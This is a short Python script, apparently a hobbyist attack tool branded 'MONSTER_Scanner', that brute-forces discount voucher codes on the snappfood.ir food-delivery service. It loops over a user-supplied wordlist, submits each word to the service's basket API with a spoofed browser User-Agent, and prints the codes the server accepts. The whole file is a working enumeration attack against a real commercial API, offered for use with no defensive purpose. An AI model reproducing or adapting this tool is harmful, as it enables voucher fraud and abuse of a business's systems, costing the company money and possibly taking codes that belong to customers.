
from colorama import init , Fore
import time
import os
import requests
import json

os.system('clear')
init() # colorama initialize

print(" __  __  ___  _   _ ____ _____ _____ ____      ____                            ")
print("|  \/  |/ _ \| \ | / ___|_   _| ____|  _ \    / ___|  ___ __ _ _ __   ___ _ __ ")
print("| |\/| | | | |  \| \___ \ | | |  _| | |_) |   \___ \ / __/ _` | '_ \ / _ \ '__|")
print("| |  | | |_| | |\  |___) || | | |___|  _ <     ___) | (_| (_| | | | |  __/ |   ")
print("|_|  |_|\___/|_| \_|____/ |_| |_____|_| \_\___|____/ \___\__,_|_| |_|\___|_|   ")
print("                                        |_____|                               ")
print("")
print(" Coded By @MONSTER_hp")
print("")
wordlist = input("File Text : ")
correct_words = []

for word in open(wordlist):
    word = word.strip("\n")
    url = 'https://snappfood.ir/mobile/v2/basket/user-976182176050'
    payload = {"actions":[{"action":"setType","argument":{"type":"normal"}},{"action":"setVoucher","argument":{"voucher_code":""+word+""}}]}

    # Create your header as required
    headers = {"content-type": "application/json", "Host": "snappfood.ir" , "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"}
    r = requests.put(url, data=json.dumps(payload), headers=headers)
    data = json.loads(r.content)
    if data['status'] == True:
       print(Fore.GREEN + "[+] {} [ Open Address ]".format(word))
       correct_words.append(word)
    else:
        print(Fore.RED + "[-] {} [ Close Address ]".format(word))

    time.sleep(4)
    
print("--------------------")
print(Fore.GREEN + "[+] Found Words : ")
for word in correct_words:
    print("- " + word)
